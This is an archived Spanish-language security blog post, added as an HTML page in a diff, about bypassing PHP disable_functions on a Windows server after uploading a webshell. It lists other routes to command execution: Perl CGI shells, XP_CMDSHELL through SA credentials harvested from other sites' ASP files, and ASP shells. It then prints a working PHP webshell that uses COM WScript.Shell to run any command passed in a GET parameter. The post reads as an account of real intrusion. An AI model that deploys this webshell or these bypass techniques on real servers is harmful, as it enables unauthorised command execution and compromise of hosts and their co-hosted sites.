@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>[Windows OS] Evadiendo Disable_functions COM() - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="Escribo este mini post, para hablar sobre el tema de evacion de ejecucion de comandos en servidores Windows, es que hace poquito subi una webshell a &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/13/windows-os-evadiendo-las/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">[Windows OS] Evadiendo Disable_functions COM()</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:48:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:48 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-2F2AhW-Ued0/VLV2vRtCpTI/AAAAAAAAAHw/pB0-vwRpTJs/s1600/disable-php-execution.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-2F2AhW-Ued0/VLV2vRtCpTI/AAAAAAAAAHw/pB0-vwRpTJs/s640/disable-php-execution.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br />Escribo este mini post, para hablar sobre el tema de evacion de  ejecucion de comandos en servidores Windows, es que hace poquito subi  una webshell a un Windows NT, y me encontre con las siguientes funciones  denegadas:<br /><br /><ul><li>system&nbsp;</li><li>shell&nbsp;</li><li>exec&nbsp;</li><li>system_exec&nbsp;</li><li>shell_exec&nbsp;</li><li>mysql_pconnect&nbsp;</li><li>passthru&nbsp;</li><li>popen&nbsp;</li><li>proc_open&nbsp;</li><li>proc_close&nbsp;</li><li>proc_nice&nbsp;</li><li>proc_terminate&nbsp;</li><li>proc_get_status&nbsp;</li><li>escapeshellarg&nbsp;</li><li>escapeshellcmd&nbsp;</li></ul><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/o0CK2.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/o0CK2.png?1" height="110" width="640" /></a></div><br /><br />Ademas recorde que el usuario Abnormality tenia el mismo problema asi  que por que no aclararlas en este escrito, ademas de hablar un poco  sobre las maneras que pueden haber para saltearnos esta restriccion que  el administrador impuso dentro del php.ini, en mi caso me tope con un  server que corre dos tecnologias web como lo son PHP y ASP, otras cosas a  tener en cuenta pegandole una ojeada a la imagen son las siguientes:<br /><br /><ul><li>Base de datos MSSQL corriendo en local.</li><li>Lenguaje Perl activo</li><li> ASP</li></ul><br />De ahora en mas ya tenemos dos maneras posibles de ejecutar comandos  en el servidor, una es utlizando alguna webshell en perl, como por  ejemplo la tan conocida “CGI telnet”, pero ademas de incluir un  .htaccess que nos agregue la extencion .pl dentro del modulo del  servidor, vamos a tener que modificar la ruta #!/usr/bin/perl por el  path en el que se encuentra instalado perl, por defecto esta es  #!C:\Program Files\perl\perl.exe pero podria estar instalado en otra ubicacion, para eso podriamos buscar la existencia de algun  perlinfo.cgi el cual es un fichero que guarda informacion de perl  similar a info.php, hay podriamos buscar el path del mismo.<br /><br />Otra manera seria ingresando a la base de datos MSSQL con  privilegios de SA y ejecutar comandos mediante la funcion XP_CMDSHELL,  esto lo podriamos hacer indagando en los scripts *.asp (formularios de  autentificacion) de los demas dominios que conviven en el servidor, ya  que no se me impedia moverme libremente por el mismo y leer ficheros  dentro de lo que son los directorios web. Obviamente se debe a una mala  configuracion de los permisos.<br /><br />Tambien podemos subir un shell en ASP.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/HGnsZ.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/HGnsZ.png?1" height="244" width="640" /></a></div><br /><br />Y por ultimo llegamos al uso de COM en php.<br /><br />Basicamente y sin dar muchas vueltas COM permite interactuar con las  aplicaciones de windows,  fue desarrlollado para trabjar con POO  (programacion orientada a objetos) y esta compuesto por objetos como  WScript.Shell el cual permite interactuar con programas como el regedit,  acceso a los directorios del sistema, entre otras tareas.<br /><br />De esta manera investigando a pleno me encuentro con el siguiente script programado por hadi-kiamarsi en php:<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php  error_reporting(E_ALL);  if (isset($_GET['hk']) and !empty($_GET['hk'])) {     $nuevo=new COM('WScript.Shell') or die('Unable to Load Activex'); //se crea el objeto WScript.Shell     $salida=$nuevo->exec($_GET['hk']); //variable de entrada para ejecucion de comandos a travez de WScript mediante exec()     echo "<pre>";<br />    echo $salida->stdout->readall; // obtencion de datos mediante stdout->readall<br />    echo "</pre>"; } ?>]]></script> El cual me premitio cumplir con mi objetivo en el servidor, lo comente un poco para que se entienda aunque es bastante sencillo e intuitivo.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/csTNy.png?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/csTNy.png?1" /></a></div><br />Saludos y espero que hayan aprendido algo nuevo, por mi parte me alegro de cada dia aparezcan nuevos desafios para seguir dandole para adelante con el conocimiento y la curiosidad!</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-13T11:48:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:48 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/13/windows-os-evadiendo-las/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/13/windows-os-evadiendo-las/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/13/kbeast-plantando-un-rootkit/" title="Previous Post: [KBEAST] Plantando Un Rootkit">&laquo; [KBEAST] Plantando Un Rootkit</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/tecnicas-de-blind-mysql-injection/" title="Next Post: Tecnicas De Blind Mysql Injection">Tecnicas De Blind Mysql Injection &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
